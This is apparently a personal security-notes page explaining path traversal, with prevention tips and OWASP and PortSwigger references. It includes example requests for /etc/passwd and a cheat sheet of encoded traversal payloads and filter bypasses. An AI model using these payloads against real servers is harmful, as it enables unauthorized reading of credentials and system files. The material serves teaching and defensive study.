# Path Traversal

Path Traversal *also known as Directory Traversal ([Portswigger](https://portswigger.net/web-security/file-path-traversal) and [OWASP](https://owasp.org/www-community/attacks/Path_Traversal))* is a direct read (and or execute) of file on the server via abusing relative path traversal of the file system from some web endpoint to then read a file from a directory not intended to be accessible. It is commonly confused with [[File-Inclusion]], which relies on the `include()` function to include file.  [OWASP](https://owasp.org/www-community/attacks/Path_Traversal): *This attack is also known as "dot-dot-slash", "directory traversal", "directory climbing" and "backtracking".* It is also a misnomer as it is dichotomy:

Path Traversal:
- Absolute Path Traversal: `vulnerable?parameter=/var/www/html/secrets.txt`
- Relative Path Traversal: `vulnerable?parameter=/var/www/html/../../etc/passwd`

- Difference between Absolute and Relative Paths:
	- Absolute Paths - `/etc/passwd` or `C:\Windows\System32\drivers\etc\hosts`
	- Relative Paths - `../etc/passwd`; relative to the position in a file system from a source position in the file system 

For a Relative Path Traversal Provide a path that is exactly as is in the URL
```bash
curl http://badwebsite/load?file=../../../../../dt/vuln --path-as-is
```

It is worth noting that while the Relative Path Traversal is more prevalent in literature Absolute Path Traversal to just a file in the same directory exists. [OWASP](https://owasp.org/www-community/attacks/Path_Traversal) example included:
```bash
# The For sites:
http://testsite.com/get.php?f=list
http://testsite.com/get.cgi?f=2
http://testsite.com/get.asp?f=test
# An attacker can execute this attack like this:
http://testsite.com/get.php?f=/var/www/html/get.php
http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc
http://testsite.com/get.asp?f=/etc/passwd
```


- Application code and data.
- Credentials for back-end systems.
	- SSH, VPN keys
	- User files containing passwords
- Sensitive operating system files.
	- Configuration files containing passwords

#### Traversal encoding:

Remember this is a guide to ideas of how to encode Directory Traversal, encoding payloads on the fly not from here.
```bash
../
..\
..\/
../etc/passwd\.\	# Path and dot truncation
../etc/passwd/./

# To bypass (recursive) stripping of `.` `/` encoding
# Singular (partial) encoding 
%2e%2e/ # ../
%2e%2e%2f # ../
..%2f # ../
%2e%2e%5c # ..\
%2e%2e\ # ..\ 
..%5c #  ..\ 
%252e%252e%255c # ..\ 
..%255c # ..\
# Double encoding 
%252e%252e%252f
# UTF-8 encoding
%c0%ae%c0%ae%c0%af	
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
# Percent Encoding
# OWASP: Note that web containers perform one level of decoding on percent encoded values from forms and URLs
..%c0%af # ../
..%c0%9c # ..\
# Nested traversal sequences
..././
....//
....\/
....\
%00					# null byte
....////			# filter bypass
/%5C../%5C..

# Non Standard encodins - Portswigger
..%c0%af
..%ef%bc%8f

# Required directory
/var/www/images/../../../etc/passwd

# Application expecting a file extension
# Use a null byte to effectively terminate the file path, before the required extension
../../../etc/passwd%00.png
```

## Prevention

- Validate the user input before processing it - ideally compare to a whitelist and or permit alphanumeric characters only
- After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.
## References

[Portswigger](https://portswigger.net/web-security/file-path-traversal)
[OWASP](https://owasp.org/www-community/attacks/Path_Traversal)